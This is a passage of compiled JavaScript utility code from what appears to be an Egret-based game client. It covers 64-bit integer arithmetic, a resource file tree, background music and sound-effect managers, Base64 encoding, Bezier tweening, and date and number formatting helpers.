    UInt64.prototype.isEqual = function (target) {
        if (!target)
            return false;
        return this._lowUint == target._lowUint && this._highUint == target._highUint;
    };
    UInt64.prototype.isGreaterThan = function (target) {
        if (target instanceof UInt64)
            return this._highUint > target._highUint || (this._highUint == target._highUint && this._lowUint > target._lowUint);
        else {
            var u64 = new UInt64();
            if (typeof target == 'string') {
                u64.value = target;
                return this.isGreaterThanOrEqual(u64);
            }
            if (typeof target == 'number') {
                u64.value = target.toString();
                return this.isGreaterThanOrEqual(u64);
            }
        }
    };
    UInt64.prototype.isGreaterThanOrEqual = function (target) {
        if (target instanceof UInt64)
            return this._highUint > target._highUint || (this._highUint == target._highUint && this._lowUint >= target._lowUint);
        else {
            var u64 = new UInt64();
            if (typeof target == 'string') {
                u64.value = target;
                return this.isGreaterThanOrEqual(u64);
            }
            if (typeof target == 'number') {
                u64.value = target.toString();
                return this.isGreaterThanOrEqual(u64);
            }
        }
    };
    Object.defineProperty(UInt64.prototype, "isZero", {
        get: function () {
            return this._lowUint == 0 && this._highUint == 0;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(UInt64.prototype, "isGreaterThanZero", {
        get: function () {
            return this._lowUint > 0 || this._highUint > 0;
        },
        enumerable: true,
        configurable: true
    });
    UInt64.prototype.writeByte = function (b) {
        b.writeUnsignedInt(this._lowUint);
        b.writeUnsignedInt(this._highUint);
    };
    UInt64.prototype.setValue = function (lowerUint, higherUint) {
        if (lowerUint === void 0) { lowerUint = 0; }
        if (higherUint === void 0) { higherUint = 0; }
        this._lowUint = lowerUint;
        this._highUint = higherUint;
    };
    Object.defineProperty(UInt64.prototype, "value", {
        set: function (v) {
            if (v instanceof egret.ByteArray) {
                this._lowUint = v.readUnsignedInt();
                this._highUint = v.readUnsignedInt();
            }
            else if (typeof v == 'string') {
                UInt64.stringToUint64(v, 10, this);
            }
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(UInt64.prototype, "valueByString", {
        set: function (value) {
            var num = 0;
        },
        enumerable: true,
        configurable: true
    });
    UInt64.prototype.leftMove = function (num, result) {
        if (result === void 0) { result = null; }
        result = result || this;
        var bitMask = UInt64.LeftMoveMask[num];
        var lowUintMaskNum = bitMask & this._lowUint;
        lowUintMaskNum = lowUintMaskNum >>> (32 - num);
        result._lowUint = this._lowUint << num;
        result._highUint = this._highUint << num;
        result._highUint = result._highUint | lowUintMaskNum;
    };
    UInt64.prototype.add = function (value, result) {
        if (result === void 0) { result = null; }
        result = result || this;
        var num = this._lowUint + value._lowUint;
        result._highUint = this._highUint + value._highUint;
        if (num >= UInt64.MaxLowUint) {
            result._highUint++;
            result._lowUint = num - UInt64.MaxLowUint;
        }
        else {
            result._lowUint = num;
        }
    };
    UInt64.prototype.subtraction = function (value, result) {
        if (result === void 0) { result = null; }
        result = result || this;
        var num = this._lowUint - value._lowUint;
        result._highUint = this._highUint - value._highUint;
        if (num < 0) {
            result._highUint--;
            result._lowUint = num + UInt64.MaxLowUint;
        }
        else {
            result._lowUint = num;
        }
    };
    UInt64.prototype.scale = function (value, result) {
        if (result === void 0) { result = null; }
        result = result || this;
        var num = this._lowUint * value;
        result._highUint = this._highUint * value;
        result._highUint += Math.floor(Math.abs(num / UInt64.MaxLowUint));
        result._lowUint = num % UInt64.MaxLowUint;
    };
    UInt64.prototype.toString = function (radix) {
        if (radix === void 0) { radix = 10; }
        var result = "";
        var lowUint = this._lowUint;
        var highUint = this._highUint;
        var highRemain;
        var lowRemain;
        var tempNum;
        while (highUint != 0 || lowUint != 0) {
            highRemain = (highUint % radix);
            tempNum = highRemain * UInt64.MaxLowUint + lowUint;
            lowRemain = tempNum % radix;
            result = lowRemain + result;
            highUint = (highUint - highRemain) / radix;
            lowUint = (tempNum - lowRemain) / radix;
        }
        return result.length ? result : "0";
    };
    UInt64.stringToUint64 = function (value, radix, result) {
        if (radix === void 0) { radix = 10; }
        if (result === void 0) { result = null; }
        result = result || new UInt64;
        var lowUint = 0;
        var highUint = 0;
        var tempNum;
        var len = value.length;
        var char;
        for (var i = 0; i < len; i++) {
            char = parseInt(value.charAt(i));
            tempNum = lowUint * radix + char;
            highUint = highUint * radix + Math.floor(tempNum / UInt64.MaxLowUint);
            lowUint = tempNum % UInt64.MaxLowUint;
        }
        result.setValue(lowUint, highUint);
        return result;
    };
    UInt64.LeftMoveMask = [0,
        0x80000000, 0x40000000, 0x20000000, 0x10000000,
        0x08000000, 0x04000000, 0x02000000, 0x01000000,
        0x00800000, 0x00400000, 0x00200000, 0x00100000,
        0x00080000, 0x00040000, 0x00020000, 0x00010000,
        0x00008000, 0x00004000, 0x00002000, 0x00001000,
        0x00000800, 0x00000400, 0x00000200, 0x00000100,
        0x00000080, 0x00000040, 0x00000020, 0x00000010,
        0x00000008, 0x00000004, 0x00000002, 0x00000001,
    ];
    UInt64.MaxLowUint = 0xffffffff + 1;
    return UInt64;
}());
__reflect(UInt64.prototype, "UInt64");
var RES;
(function (RES) {
    var NewFileSystem = (function () {
        function NewFileSystem(data) {
            this.data = data;
        }
        NewFileSystem.prototype.profile = function () {
            console.log(this.data);
        };
        NewFileSystem.prototype.addFile = function (filename, type) {
            if (!type)
                type = "";
            filename = RES.path.normalize(filename);
            var basefilename = RES.path.basename(filename);
            var folder = RES.path.dirname(filename);
            if (!this.exists(folder)) {
                this.mkdir(folder);
            }
            var d = this.resolve(folder);
            d[basefilename] = { url: filename, type: type };
        };
        NewFileSystem.prototype.getFile = function (filename) {
            var result = this.resolve(filename);
            if (result) {
                result.name = filename;
            }
            return result;
        };
        NewFileSystem.prototype.resolve = function (dirpath) {
            if (dirpath == "") {
                return this.data;
            }
            dirpath = RES.path.normalize(dirpath);
            var list = dirpath.split("/");
            var current = this.data;
            for (var _i = 0, list_2 = list; _i < list_2.length; _i++) {
                var f = list_2[_i];
                if (current) {
                    current = current[f];
                }
                else {
                    return current;
                }
            }
            return current;
        };
        NewFileSystem.prototype.mkdir = function (dirpath) {
            dirpath = RES.path.normalize(dirpath);
            var list = dirpath.split("/");
            var current = this.data;
            for (var _i = 0, list_3 = list; _i < list_3.length; _i++) {
                var f = list_3[_i];
                if (!current[f]) {
                    current[f] = {};
                }
                current = current[f];
            }
        };
        NewFileSystem.prototype.exists = function (dirpath) {
            if (dirpath == "")
                return true;
            dirpath = RES.path.normalize(dirpath);
            var list = dirpath.split("/");
            var current = this.data;
            for (var _i = 0, list_4 = list; _i < list_4.length; _i++) {
                var f = list_4[_i];
                if (!current[f]) {
                    return false;
                }
                current = current[f];
            }
            return true;
        };
        return NewFileSystem;
    }());
    RES.NewFileSystem = NewFileSystem;
    __reflect(NewFileSystem.prototype, "RES.NewFileSystem");
})(RES || (RES = {}));
var SoundBg = (function (_super) {
    __extends(SoundBg, _super);
    function SoundBg() {
        var _this = _super.call(this) || this;
        _this._currBg = "";
        return _this;
    }
    SoundBg.prototype.stop = function () {
        if (this._currSoundChannel) {
            this.removeSoundChannel(this._currSoundChannel);
        }
        this._currSoundChannel = null;
        this._currSound = null;
        this._currBg = "";
    };
    SoundBg.prototype.play = function (effectName) {
        if (this._currBg == effectName)
            return;
        this.stop();
        this._currBg = effectName;
        var sound = this.getSound(effectName);
        if (sound) {
            this.playSound(sound);
        }
    };
    SoundBg.prototype.touchPlay = function () {
        if (this._currSoundChannel && this._currSound) {
            var pos = this._currSoundChannel.position;
            this.removeSoundChannel(this._currSoundChannel);
            this._currSoundChannel = this._currSound.play(pos, 1);
            this.addSoundChannel(this._currSoundChannel);
        }
    };
    SoundBg.prototype.playSound = function (sound) {
        this._currSound = sound;
        this._currSoundChannel = this._currSound.play(0, 1);
        this.addSoundChannel(this._currSoundChannel);
    };
    SoundBg.prototype.onSoundComplete = function () {
        if (this._currSoundChannel)
            this.removeSoundChannel(this._currSoundChannel);
        this.playSound(this._currSound);
    };
    SoundBg.prototype.addSoundChannel = function (channel) {
        channel.volume = this._volume;
        channel.addEventListener(egret.Event.SOUND_COMPLETE, this.onSoundComplete, this);
    };
    SoundBg.prototype.removeSoundChannel = function (channel) {
        channel.removeEventListener(egret.Event.SOUND_COMPLETE, this.onSoundComplete, this);
        channel.stop();
    };
    SoundBg.prototype.setVolume = function (volume) {
        this._volume = volume;
        if (this._currSoundChannel) {
            this._currSoundChannel.volume = this._volume;
        }
    };
    SoundBg.prototype.loadedPlay = function (key) {
        if (this._currBg == key) {
            var sound = RES.getRes(key);
            if (!sound) {
                return;
            }
            this.playSound(sound);
        }
    };
    SoundBg.prototype.checkCanClear = function (key) {
        return this._currBg != key;
    };
    return SoundBg;
}(BaseSound));
__reflect(SoundBg.prototype, "SoundBg");
var SoundEffects = (function (_super) {
    __extends(SoundEffects, _super);
    function SoundEffects() {
        return _super.call(this) || this;
    }
    SoundEffects.prototype.play = function (effectName) {
        var sound = this.getSound(effectName);
        if (sound) {
            this.playSound(sound);
        }
    };
    SoundEffects.prototype.playSound = function (sound) {
        var channel = sound.play(0, 1);
        channel.volume = this._volume;
    };
    SoundEffects.prototype.setVolume = function (volume) {
        this._volume = volume;
    };
    SoundEffects.prototype.loadedPlay = function (key) {
        var sound = RES.getRes(key);
        if (!sound) {
            return;
        }
        this.playSound(sound);
    };
    return SoundEffects;
}(BaseSound));
__reflect(SoundEffects.prototype, "SoundEffects");
var SoundManager = (function (_super) {
    __extends(SoundManager, _super);
    function SoundManager() {
        var _this = _super.call(this) || this;
        _this.bgOn = true;
        _this.effectOn = true;
        _this.bgVolume = 0.5;
        _this.effectVolume = 0.5;
        _this.bg = new SoundBg();
        _this.bg.setVolume(_this.bgVolume);
        _this.effect = new SoundEffects();
        _this.effect.setVolume(_this.effectVolume);
        return _this;
    }
    SoundManager.ins = function () {
        return _super.ins.call(this);
    };
    SoundManager.prototype.playEffect = function (effectName) {
        if (!this.effectOn)
            return;
        this.effect.play(effectName);
    };
    SoundManager.prototype.playBg = function (bgName) {
        this.currBg = bgName;
        if (!this.bgOn)
            return;
        this.bg.play(bgName);
    };
    SoundManager.prototype.stopBg = function () {
        this.bg.stop();
    };
    SoundManager.prototype.touchBg = function () {
        if (egret.Capabilities.isMobile && egret.Capabilities.os == 'iOS') {
            this.bg.touchPlay();
        }
    };
    SoundManager.prototype.setEffectOn = function ($isOn) {
        this.effectOn = $isOn;
    };
    SoundManager.prototype.setBgOn = function ($isOn) {
        this.bgOn = $isOn;
        if (!this.bgOn) {
            this.stopBg();
        }
        else {
            if (this.currBg) {
                this.playBg(this.currBg);
            }
        }
    };
    SoundManager.prototype.setBgVolume = function (volume) {
        volume = Math.min(volume, 1);
        volume = Math.max(volume, 0);
        this.bgVolume = volume;
        this.bg.setVolume(this.bgVolume);
    };
    SoundManager.prototype.getBgVolume = function () {
        return this.bgVolume;
    };
    SoundManager.prototype.setEffectVolume = function (volume) {
        volume = Math.min(volume, 1);
        volume = Math.max(volume, 0);
        this.effectVolume = volume;
        this.effect.setVolume(this.effectVolume);
    };
    SoundManager.prototype.getEffectVolume = function () {
        return this.effectVolume;
    };
    return SoundManager;
}(SingleClass));
__reflect(SoundManager.prototype, "SoundManager");
var Base64 = (function () {
    function Base64() {
    }
    Base64.base64encode = function (str) {
        var out, i, len;
        var c1, c2, c3;
        len = str.length;
        i = 0;
        out = "";
        while (i < len) {
            c1 = str.charCodeAt(i++) & 0xff;
            if (i == len) {
                out += this.base64EncodeChars.charAt(c1 >> 2);
                out += this.base64EncodeChars.charAt((c1 & 0x3) << 4);
                out += "==";
                break;
            }
            c2 = str.charCodeAt(i++);
            if (i == len) {
                out += this.base64EncodeChars.charAt(c1 >> 2);
                out += this.base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));
                out += this.base64EncodeChars.charAt((c2 & 0xF) << 2);
                out += "=";
                break;
            }
            c3 = str.charCodeAt(i++);
            out += this.base64EncodeChars.charAt(c1 >> 2);
            out += this.base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));
            out += this.base64EncodeChars.charAt(((c2 & 0xF) << 2) | ((c3 & 0xC0) >> 6));
            out += this.base64EncodeChars.charAt(c3 & 0x3F);
        }
        return out;
    };
    Base64.base64decode = function (str) {
        var c1, c2, c3, c4;
        var i, len, out;
        len = str.length;
        i = 0;
        out = "";
        while (i < len) {
            do {
                c1 = this.base64DecodeChars[str.charCodeAt(i++) & 0xff];
            } while (i < len && c1 == -1);
            if (c1 == -1)
                break;
            do {
                c2 = this.base64DecodeChars[str.charCodeAt(i++) & 0xff];
            } while (i < len && c2 == -1);
            if (c2 == -1)
                break;
            out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));
            do {
                c3 = str.charCodeAt(i++) & 0xff;
                if (c3 == 61)
                    return out;
                c3 = this.base64DecodeChars[c3];
            } while (i < len && c3 == -1);
            if (c3 == -1)
                break;
            out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));
            do {
                c4 = str.charCodeAt(i++) & 0xff;
                if (c4 == 61)
                    return out;
                c4 = this.base64DecodeChars[c4];
            } while (i < len && c4 == -1);
            if (c4 == -1)
                break;
            out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
        }
        return out;
    };
    Base64.base64EncodeChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    Base64.base64DecodeChars = [-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,
        52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1,
        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
        15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1,
        -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
        41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1];
    return Base64;
}());
__reflect(Base64.prototype, "Base64");
var BezierWarp = (function () {
    function BezierWarp(fp, ep) {
        this._fromPoint = fp;
        this._toPoint = ep;
    }
    BezierWarp.pop = function (fp, ep) {
        var bezier = null;
        if (this._pool.length) {
            bezier = this._pool.pop();
            bezier.fromPoint = fp;
            bezier.toPoint = ep;
        }
        else {
            bezier = new BezierWarp(fp, ep);
        }
        return bezier;
    };
    BezierWarp.push = function (bezier) {
        if (bezier) {
            bezier.display = null;
            bezier.ease = null;
            bezier.fromPoint = null;
            bezier.toPoint = null;
            bezier.centerPoint = null;
            this._pool.push(bezier);
        }
    };
    Object.defineProperty(BezierWarp.prototype, "fromPoint", {
        set: function (value) {
            this._fromPoint = value;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(BezierWarp.prototype, "toPoint", {
        set: function (value) {
            this._toPoint = value;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(BezierWarp.prototype, "display", {
        set: function (value) {
            this._display = value;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(BezierWarp.prototype, "ease", {
        set: function (value) {
            this._ease = value;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(BezierWarp.prototype, "centerPoint", {
        set: function (value) {
            this._centerPoint = value;
        },
        enumerable: true,
        configurable: true
    });
    BezierWarp.prototype.start = function (time, callback, callObj, delay) {
        var _this = this;
        if (delay === void 0) { delay = 0; }
        egret.Tween.get(this).wait(delay).to({ factor: 1 }, time, this._ease).call(function () {
            egret.Tween.removeTweens(_this);
            if (callback) {
                callback.call(callObj);
            }
        });
    };
    Object.defineProperty(BezierWarp.prototype, "factor", {
        get: function () {
            return 0;
        },
        set: function (value) {
            this._display.x = (1 - value) * (1 - value) * this._fromPoint.x + 2 * value * (1 - value) * this._centerPoint.x + value * value * this._toPoint.x;
            this._display.y = (1 - value) * (1 - value) * this._fromPoint.y + 2 * value * (1 - value) * this._centerPoint.y + value * value * this._toPoint.y;
        },
        enumerable: true,
        configurable: true
    });
    BezierWarp._pool = [];
    return BezierWarp;
}());
__reflect(BezierWarp.prototype, "BezierWarp");
var ColorUtils = (function () {
    function ColorUtils() {
    }
    ColorUtils.getColorcChinese = function (type) {
        return LangMgr.getValueByKey("colorcChinese" + type);
    };
    Object.defineProperty(ColorUtils, "BLACK", {
        get: function () {
            return LangMgr.getColor('black');
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(ColorUtils, "ALPHA", {
        get: function () {
            return LangMgr.getColor('alpha');
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(ColorUtils, "RED", {
        get: function () {
            return LangMgr.getColor('red');
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(ColorUtils, "GREEN", {
        get: function () {
            return LangMgr.getColor('green');
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(ColorUtils, "BLUE", {
        get: function () {
            return LangMgr.getColor('blue');
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(ColorUtils, "YELLOW", {
        get: function () {
            return LangMgr.getColor('yellow');
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(ColorUtils, "GRAY", {
        get: function () {
            return LangMgr.getColor('gray');
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(ColorUtils, "NORMAL_COLOR", {
        get: function () {
            return LangMgr.getColor('normalColor');
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(ColorUtils, "WHITE_COLOR", {
        get: function () {
            return LangMgr.getValueByKey('whiteColor');
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(ColorUtils, "RED_COLOR", {
        get: function () {
            return LangMgr.getValueByKey('redColor');
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(ColorUtils, "GREEN_COLOR", {
        get: function () {
            return LangMgr.getValueByKey('greenColor');
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(ColorUtils, "GRAY_COLOR", {
        get: function () {
            return LangMgr.getValueByKey('grayColor');
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(ColorUtils, "ATTR_DEFAULT_COLOR", {
        get: function () {
            return LangMgr.getColor('attrDefaultColor');
        },
        enumerable: true,
        configurable: true
    });
    return ColorUtils;
}());
__reflect(ColorUtils.prototype, "ColorUtils");
var CommonUtils = (function (_super) {
    __extends(CommonUtils, _super);
    function CommonUtils() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    CommonUtils.addLableStrokeColor = function (lable, color, stroke) {
        lable.strokeColor = color;
        lable.stroke = stroke;
    };
    CommonUtils.getObjectLength = function (list) {
        var num = 0;
        for (var i in list) {
            num++;
        }
        return num;
    };
    CommonUtils.getObjectByAttr = function (list, attrName, attrValue) {
        for (var i in list) {
            if (list[i][attrName] == attrValue) {
                return list[i];
            }
        }
        return null;
    };
    CommonUtils.getObjectByUnionAttr = function (list, attrValue, attrValue1) {
        for (var i in list) {
            if (i == attrValue.toString()) {
                for (var j in list[i]) {
                    if (j == attrValue1.toString()) {
                        return list[i][j];
                    }
                }
            }
        }
        return null;
    };
    CommonUtils.copyDataHandler = function (obj) {
        var newObj;
        if (obj instanceof Array) {
            newObj = [];
        }
        else if (obj instanceof Object) {
            newObj = {};
        }
        else {
            return obj;
        }
        var keys = Object.keys(obj);
        for (var i = 0, len = keys.length; i < len; i++) {
            var key = keys[i];
            newObj[key] = this.copyDataHandler(obj[key]);
        }
        return newObj;
    };
    CommonUtils.copyDataDepth = function (data) {
        var copyData;
        if (!(data instanceof Object)) {
            return data;
        }
        var className = egret.getQualifiedClassName(data);
        if (className) {
            try {
                var Cls = egret.getDefinitionByName(className);
                if (Cls && Cls.constructor) {
                    copyData = new Cls();
                }
                else {
                    copyData = {};
                }
            }
            catch (e) {
                copyData = {};
            }
        }
        else {
            copyData = {};
        }
        var keys = Object.keys(data);
        var len = keys.length;
        for (var i = 0; len > i; i++) {
            var key = keys[i];
            if ("function" != typeof data[key]) {
                copyData[key] = this.copyDataDepth(data[key]);
            }
        }
        return copyData;
    };
    CommonUtils.objectToArray = function (obj) {
        if (obj instanceof Object) {
            obj = this.copyDataHandler(obj);
            return this.objectToArrayShallow(obj);
        }
        else {
            return obj;
        }
    };
    CommonUtils.objectToArrayShallow = function (obj) {
        if (obj instanceof Object) {
            var arr = [];
            for (var key in obj) {
                if (obj[key] != null) {
                    arr.push(obj[key]);
                }
            }
            return arr;
        }
        return obj;
    };
    CommonUtils.arraySort = function (arr, key, sortType) {
        if (sortType === void 0) { sortType = 0; }
        arr.sort(function (a, b) {
            return SortUtils.sortByKey(a, b, key, sortType);
        });
        return arr;
    };
    CommonUtils.lock = function () {
        StageUtils.ins().getStage().touchEnabled = StageUtils.ins().getStage().touchChildren = false;
    };
    CommonUtils.unlock = function () {
        StageUtils.ins().getStage().touchEnabled = StageUtils.ins().getStage().touchChildren = true;
    };
    CommonUtils.labelIsOverLenght = function (label, num) {
        label.text = this.overLength(num);
    };
    CommonUtils.overLength = function (num) {
        var str = null;
        if (num < 100000) {
            str = Math.floor(num) + "";
        }
        else if (num > 100000000) {
            num = (num / 100000000);
            num = Math.floor(num * 10) / 10;
            str = LangMgr.getValueByKey('shopWan1', num);
        }
        else {
            num = (num / 10000);
            num = Math.floor(num * 10) / 10;
            str = LangMgr.getValueByKey('shopWan', num);
        }
        return str;
    };
    CommonUtils.overLengthChange = function (num) {
        var str = null;
        if (num < 10000) {
            str = Math.floor(num) + "";
        }
        else if (num > 100000000) {
            num = (num / 100000000);
            num = Math.floor(num * 10) / 10;
            str = LangMgr.getValueByKey('shopWan1', num);
        }
        else {
            num = (num / 10000);
            num = Math.floor(num * 10) / 10;
            str = LangMgr.getValueByKey('shopWan', num);
        }
        return str;
    };
    CommonUtils.overLengthNo = function (num) {
        var str = null;
        if (num < 10000) {
            str = Math.floor(num) + "";
        }
        else if (num > 100000000) {
            num /= 100000000;
            num = Math.floor(num * 10) / 10;
            str = LangMgr.getValueByKey('shopWan1', num);
        }
        else {
            num /= 10000;
            num = Math.floor(num * 10) / 10;
            str = LangMgr.getValueByKey('shopWan', num);
        }
        return str;
    };
    CommonUtils.getImgBase64Data = function (img) {
        var render = new egret.RenderTexture();
        render.drawToTexture(img);
        var base64 = render.toDataURL('image/png');
    };
    CommonUtils.searchIndex = function (source, data, fun) {
        if (!source || source.length == 0) {
            return 0;
        }
        if (!fun) {
            fun = SortUtils.sortDescByKey;
        }
        var low = 0;
        var high = source.length - 1;
        while (low <= high) {
            var mid = (high + low) >> 1;
            var val = source[mid];
            if (fun(val, data) <= 0) {
                low = mid + 1;
            }
            else {
                high = mid - 1;
            }
        }
        return low;
    };
    return CommonUtils;
}(SingleClass));
__reflect(CommonUtils.prototype, "CommonUtils");
var DateStyle = (function () {
    function DateStyle(format, from, to, isFormatNum) {
        this.format = [];
        this.from = 0;
        this.to = 0;
        this.isFormatNum = false;
        this.format = format;
        this.from = from;
        this.to = to;
        this.isFormatNum = isFormatNum;
    }
    return DateStyle;
}());
__reflect(DateStyle.prototype, "DateStyle");
var DateUtils = (function () {
    function DateUtils() {
    }
    Object.defineProperty(DateUtils, "FORMAT_1", {
        get: function () {
            if (!this.format_1_value) {
                this.format_1_value = [
                    LangMgr.getValueByKey('activitSS'),
                    LangMgr.getValueByKey('activitMine', ''),
                    LangMgr.getValueByKey('dateType1'),
                    LangMgr.getValueByKey('activitDay', ''),
                    LangMgr.getValueByKey('activitMonth'),
                    LangMgr.getValueByKey('dateType2'),
                ];
            }
            return this.format_1_value;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DateUtils, "STYLE_1", {
        get: function () {
            if (!this.style_1_value) {
                this.style_1_value = new DateStyle(DateUtils.FORMAT_1, DateUtils.TO_SECOND, DateUtils.TO_HOUR, false);
            }
            return this.style_1_value;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DateUtils, "STYLE_2", {
        get: function () {
            if (!this.style_2_value) {
                this.style_2_value = new DateStyle(DateUtils.FORMAT_1, DateUtils.TO_SECOND, DateUtils.TO_DAY, false);
            }
            return this.style_2_value;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(DateUtils, "STYLE_4", {
        get: function () {
            if (!this.style_4_value) {
                this.style_4_value = new DateStyle(DateUtils.FORMAT_1, DateUtils.TO_SECOND, DateUtils.TO_MINUTE, true);
            }
            return this.style_4_value;
        },
        enumerable: true,
        configurable: true
    });
    DateUtils.getFormatTimeByStyle = function (second, style) {
        if (style === void 0) { style = DateUtils.STYLE_1; }
        if (second < 0) {
            second = 0;
        }
        if (style.from > style.to) {
            return "";
        }
        second = second >> 0;
        var result = "";
        for (var i = style.to; i >= style.from; i--) {
            var time = second / this.mul[i];
            var timeStr = "";
            if (i != style.to)
                time = time % this.mod[i];
            if (style.isFormatNum && time < 10)
                timeStr = "0" + (time >> 0).toString();
            else
                timeStr = (time >> 0).toString();
            result += (timeStr + style.format[i]);
        }
        return result;
    };
    DateUtils.getFormatTimeByStyle1 = function (ms, style) {
        if (style === void 0) { style = DateUtils.STYLE_1; }
        return this.getFormatTimeByStyle(ms / this.MS_PER_SECOND);
    };
    DateUtils.formatMiniDateTime = function (mdt) {
        return DateUtils.MINI_DATE_TIME_BASE + (mdt & 0x7FFFFFFF) * DateUtils.MS_PER_SECOND;
    };
    DateUtils.formatServerTime = function (time) {
        return (time - DateUtils.MINI_DATE_TIME_BASE) / DateUtils.MS_PER_SECOND;
    };
    DateUtils.getFormatBySecond = function (second, type, showLength, format) {
        if (type === void 0) { type = 1; }
        if (showLength === void 0) { showLength = 2; }
        if (format === void 0) { format = true; }
        var str = "";
        var ms = second * 1000;
        switch (type) {
            case this.TIME_FORMAT_1:
                str = this.format_1(ms);
                break;
            case this.TIME_FORMAT_2:
                str = this.format_2(ms);
                break;
            case this.TIME_FORMAT_3:
                str = this.format_3(ms);
                break;
            case this.TIME_FORMAT_4:
                str = this.format_4(ms);
                break;
            case this.TIME_FORMAT_5:
                str = this.format_5(ms, showLength, format);
                break;
            case this.TIME_FORMAT_6:
                str = this.format_6(ms);
                break;
            case this.TIME_FORMAT_7:
                str = this.format_7(ms);
                break;
            case this.TIME_FORMAT_8:
                str = this.format_8(ms);
                break;
            case this.TIME_FORMAT_9:
                str = this.format_9(ms);
                break;
            case this.TIME_FORMAT_10:
                str = this.format_10(ms);
                break;
            case this.TIME_FORMAT_11:
                str = this.format_11(ms);
                break;
            case this.TIME_FORMAT_12:
                str = this.format_12(ms);
                break;
            case this.TIME_FORMAT_13:
                str = this.format_13(ms);
                break;
            case this.TIME_FORMAT_14:
                str = this.format_14(ms);
                break;
            case this.TIME_FORMAT_15:
                str = this.format_15(ms);
                break;
            case this.TIME_FORMAT_16:
                str = this.format_16(ms);
                break;
            case this.TIME_FORMAT_17:
                str = this.format_17(ms);
                break;
            case this.TIME_FORMAT_19:
                str = this.format_19(second);
                break;
            case this.TIME_FORMAT_20:
                str = this.format_20(second);
                break;
        }
        return str;
    };
    DateUtils.getRenainSecond = function (ms) {
        var tmpDate = ms ? new Date(ms) : new Date();
        var ptime = (DateUtils.getTodayZeroSecond(tmpDate) + 60 * 60 * 24) - tmpDate.getTime() / 1000;
        return ptime.toFixed(0);
    };
    DateUtils.getTodayPassedSecond = function () {
        var tmpDate = new Date();
        var tdyPassTime = ((Date.now() - (new Date(tmpDate.getFullYear(), tmpDate.getMonth(), tmpDate.getDate()).getTime())) / 1000).toFixed(0);
        return parseInt(tdyPassTime);
    };
    DateUtils.getTodayZeroSecond = function (tdate) {
        var tmpDate = tdate ? tdate : new Date();
        return parseInt(((new Date(tmpDate.getFullYear(), tmpDate.getMonth(), tmpDate.getDate()).getTime()) / 1000).toFixed(0));
    };
    DateUtils.showWeekFirstDay = function () {
        var Nowdate = new Date();
        var day = Nowdate.getDay();
        day = day ? day : 7;
        var WeekFirstDay = new Date(Nowdate - (day - 1) * 86400000);
        return WeekFirstDay;
    };
    DateUtils.showWeekLastDay = function () {
        var Nowdate = new Date();
        var WeekFirstDay = DateUtils.showWeekFirstDay();
        var WeekLastDay = new Date((WeekFirstDay / 1000 + 6 * 86400) * 1000);
        return WeekLastDay;
    };
    DateUtils.calcWeekFirstDay = function () {
        var Nowdate = new Date();
        var curDay = Nowdate.getDay();
        curDay = curDay > 0 ? curDay : 7;
        var difday = 7 - curDay;
        var hours = Nowdate.getHours();
        var minutes = Nowdate.getMinutes();
        var seconds = Nowdate.getSeconds();
        var sum = difday * 86400 * 1000 + 86400 * 1000 - (hours * 3600 * 1000 + minutes * 60 * 1000 + seconds * 1000);
        return new Date(sum);
    };
    DateUtils.calcNextDay = function (time) {
        var Nowdate = time ? new Date(time) : new Date();
        var curHour = Nowdate.getHours();
        var difHour = 24 - curHour;
        var minutes = Nowdate.getMinutes();
        var seconds = Nowdate.getSeconds();
        var sum = difHour * DateUtils.MS_PER_HOUR - (minutes * DateUtils.MS_PER_MINUTE + seconds * DateUtils.MS_PER_SECOND);
        return sum;
    };
    DateUtils.calcNextNDay = function (curTime, addDay, serverTime) {
        if (addDay === void 0) { addDay = 0; }
        var zeroTime = DateUtils.calcNextDay(curTime);
        var dayTime = addDay * DateUtils.SECOND_PER_DAY * DateUtils.MS_PER_SECOND;
        var endTime = Math.floor((curTime + zeroTime + dayTime - serverTime) / DateUtils.MS_PER_SECOND);
        return endTime;
    };
    DateUtils.sameDay = function (time1, time2) {
        var result = false;
        var date1 = new Date(time1);
        var date2 = new Date(time2);
        if (date1.getFullYear() == date2.getFullYear() && date1.getMonth() == date2.getMonth() && date1.getDate() == date2.getDate()) {
            result = true;
        }
        return result;
    };
